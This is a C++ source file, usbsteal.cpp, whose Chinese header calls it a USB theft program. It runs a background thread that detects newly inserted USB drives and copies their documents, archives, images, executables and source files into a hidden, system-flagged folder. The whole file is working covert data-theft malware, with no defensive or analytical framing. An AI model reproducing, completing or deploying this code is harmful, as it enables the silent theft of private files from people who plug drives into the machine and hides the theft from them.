/*
* Copyright (c) 2005, Outmatch@gmail.com
* All rights reserved.
*
* 文件名称：usbsteal.cpp
* 摘    要：USB盗窃程序,生成线程监视并盗窃U盘内容
*/

#include "stdafx.h"
#include "config.h"
#include "folderutils.h"

using namespace std;

typedef std::vector<std::string> usbList;

extern const std::string& getConfigPath();
extern std::string getDestDirName();
extern usbList searchforUSB();
extern DWORD setDirHidden(const std::string &dir);
extern void copierThreadFunc(LPVOID *);
extern std::string getSystemPath();
extern std::string getVolumeName(const std::string& sDevice);

HRESULT   EnumDirectory(LPCTSTR   lpszDirectory,BOOL   bIncludeSubDirectory, std::vector<std::string>& vsFiles);

/// 当前U盘盘符
char g_szCurVol[MAX_PATH+1] = { 0 };

/// 搜索U盘间隔时间，毫秒
enum { INTERVAL = 1000 };

/// 搜索新出现的U盘，找到后返回其盘符
usbList searchforUSB()
{
	static usbList prevUsbList; 
	usbList list;
	char buf[MAX_PATH+1];
	DWORD len = GetLogicalDriveStrings(sizeof(buf), buf);

	for(CHAR *s=buf; *s; s+=strlen(s) + 1) {
		UINT uDriveType = GetDriveType(s);
		if(uDriveType == DRIVE_REMOVABLE) {
			list.push_back((s));
		}
	}

	if(prevUsbList == list) {
		list.clear();
		return list;
	}
	else {
		// 有改变,报告prevUsbList 和 list差异的部分.
		usbList newlist;

		for(usbList::iterator it = list.begin();
				it != list.end();
				++it)
		{
			bool skip = false;
			for(size_t i=0; i<prevUsbList.size(); i++) {
				if(*it == prevUsbList[i])
				{
					skip = true;	
					break;
				}
				else
				{
					skip = false;
				}
			}

			if(skip == false) {
				newlist.push_back(*it);
			}
		}
		prevUsbList = list;
		return newlist;
	}
}

/// 复制文件的白名单，如果有*出现则无条件复制
const char* g_szFileAcceptList[] = {
	"doc",
	"xls",
	"ppt",
	"exe",
	"zip",
	"rar",
	"txt",
	"rtf",
	"pdf",
	"html",
	"htm",
	"jpg",
	"gif",
	"png",
	"cpp",
	"hpp",
	"c",
	"h",
//	"*",	全部复制
	0
};

/** 检测文件是否需要复制 */
bool needCopy(const std::string &path)
{
	char szExt[MAX_PATH+1] = { 0 }; 
	_splitpath(path.c_str(), 0, 0, 0, szExt);
	for(const char** p = g_szFileAcceptList; *p != 0; p++) {
		// 如果是*，返回真
		if(stricmp(*p, "*") == 0)
			return true;
		// ".doc", 跳过点字符
		if(stricmp(*p, szExt+1) == 0)
			return true;
	}
	return false;
}

/// 得到复制目的文件名，根据源文件名和目标路径
std::string getOutputFilename(const std::string& sFilename, const std::string& sSrcDir, const std::string &sDstDir)
{
	size_t pos = sFilename.find(sSrcDir);
	if(pos == std::string::npos)
		return sDstDir + sFilename;
	pos += sSrcDir.length();
	if(sDstDir[sDstDir.length()-1] != '\\')
		return sDstDir + "\\" + sFilename.substr(pos);
	return sDstDir + sFilename.substr(pos);
}

/// 复制线程
void copierThreadFunc(LPVOID *)
{
	// Search for USB device
	for( ;; ) {
		usbList list;
		list = searchforUSB();

		if(list.size() > 0) {
			for(size_t i=0; i<list.size(); i++) {
				string srcDir = list[i];
//				strcpy(g_szCurVol, srcDir.c_str());
				g_szCurVol[0] = srcDir[0];
				strcpy(&g_szCurVol[1], ":\\");
				string dstDir = getDestDirName();
				// srcDir += "*.*";
#if 0
				MessageBox(0, srcDir.c_str(), "SRC", 0);
#endif
				// 开始复制文件
				// TODO:　使用文件通配列表
				// CFolderUtils::CopyFolder(srcDir.c_str(), dstDir.c_str());
				std::vector<std::string> v;
				EnumDirectory(srcDir.c_str(), TRUE, v);
				for(std::vector<std::string>::iterator
						it = v.begin();
						it != v.end();
						++it) 
				{
					if(needCopy(*it)) {
						std::string sDstFileName = getOutputFilename(*it, srcDir, dstDir);
						// TODO: 创建文件夹
						char szDrive[3], szDir[MAX_PATH+1];
						_splitpath(sDstFileName.c_str(), szDrive, szDir, 0, 0);
						std::string sDir = szDrive;
						sDir += szDir;
						CFolderUtils::CreateFolder(sDir.c_str());
						CopyFile(it->c_str(), sDstFileName.c_str(), FALSE);
					}
				}
				
				Sleep(INTERVAL);
			}
		}

		Sleep(INTERVAL);
	}
	_endthread();
}

/// 过滤不能为目录名的\/:*?"<>|字符
void filterBadChar(std::string &str)
{
	static const char *szBadChar = "\\/:*?\"<>|";
	for(size_t i=0; i<str.length(); ++i) {
		for(size_t j=0; j<strlen(szBadChar); ++j) {
			if(str[i] == szBadChar[j])
				str[i] = '-';
		}
	}
}

// 得到卷标名，输入为盘标
std::string getVolumeName(const std::string& sDevice)
{
	char szVol[256];
	char FileSysName[256];
	DWORD SerialNum;//序列号  
	DWORD FileNameLength;  
	DWORD FileSysFlag;
	memset(szVol, 0, 256);
	int iRet = ::GetVolumeInformation(sDevice.c_str(),
		szVol,  
		256,  
		&SerialNum,  
		&FileNameLength,  
		&FileSysFlag,  
		FileSysName,  
		256);
	if(iRet)
		return szVol;
	return "";
}

/// 生成输出目录名: 格式: 日期 - 时间 - 卷标名
std::string getOutputDirname()
{
	time_t ti = time(0);

	char datebuf[9];
	_strdate(datebuf);
	std::string sDate(datebuf);
	filterBadChar(sDate);

	char timebuf[9];
	_strtime(timebuf);
	std::string sTime(timebuf);
	filterBadChar(sTime);

	std::string str = getVolumeName(g_szCurVol);

	if(str == "") {
		str = "无卷标";
	}

	filterBadChar(str);

	char buf[1024];
	_snprintf(buf, 1024, "%s %s %s", sDate.c_str(), sTime.c_str(), str.c_str());
	
	return buf;
}

std::string loadConfig()
{
	std::string dir;
	dir = getConfigPath();
	ifstream f(dir.c_str());
	f >> dir;
	dir += "\\";
	return dir;
}

/// 得到复制目标目录名
std::string getDestDirName()
{
	std::string dir = loadConfig();

	CFolderUtils::CreateFolder(dir.c_str());
	setDirHidden(dir);

	std::string str = getOutputDirname();
	dir += str;
	CFolderUtils::CreateFolder(dir.c_str());

	return dir;
}

/// 将目录设为隐藏
DWORD setDirHidden(const std::string &dir)
{
	DWORD stat = GetFileAttributes( dir.c_str());
	stat |= FILE_ATTRIBUTE_HIDDEN | FILE_ATTRIBUTE_SYSTEM;
	DWORD ret = SetFileAttributes( dir.c_str(), stat );

	return ret;
}

